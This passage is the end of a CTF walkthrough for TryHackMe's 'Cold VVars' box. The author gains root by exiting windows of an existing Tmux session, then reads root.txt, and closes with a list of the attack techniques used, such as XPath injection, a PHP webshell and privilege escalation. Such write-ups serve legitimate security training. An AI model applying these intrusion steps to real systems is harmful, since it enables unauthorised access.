> Note: You must set the `TERM` environment variable to a valid terminal.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120193001.png)

Umm... Let's google how to use Tmux.

[This tutorial](https://leimao.github.io/blog/Tmux-Tutorial/) looks good.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120193045.png)

So, in our Tmux session, there are 9 windows.

However, I tried to move to the next window, but it doesn't work. Perhaps I'm inside a reverse shell and many things broke.

**Anyways, let's just `exit` those windows, until something interesting happened:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120193410.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120193520.png)

**In the sixth window, we found there is a `root` user!!**

Let's `exit` again until we reach to `root`'s pane:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120193614.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Cold-VVars/images/Pasted%20image%2020230120193631.png)

```shell
root@incognito:~# whoami;hostname;id;ip a
root
incognito
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:59:a0:6d:21:8f brd ff:ff:ff:ff:ff:ff
    inet 10.10.207.207/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2849sec preferred_lft 2849sec
    inet6 fe80::59:a0ff:fe6d:218f/64 scope link 
       valid_lft forever preferred_lft forever
root@incognito:~# 
```

I'm root! :D

## Rooted

**root.txt:**
```shell
root@incognito:~# cat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating SMB
2. Enumerating Hidden Directories and Files via `gobuster`
3. Exploiting XPath Injection In Login Page
4. Uploading PHP Webshell Via SMB
5. Port Forwarding
6. Password Spraying
7. Vertical Privilege Escalation Via `vim`
8. Horizontal Privilege Escalation Via Hijacking Tmux Session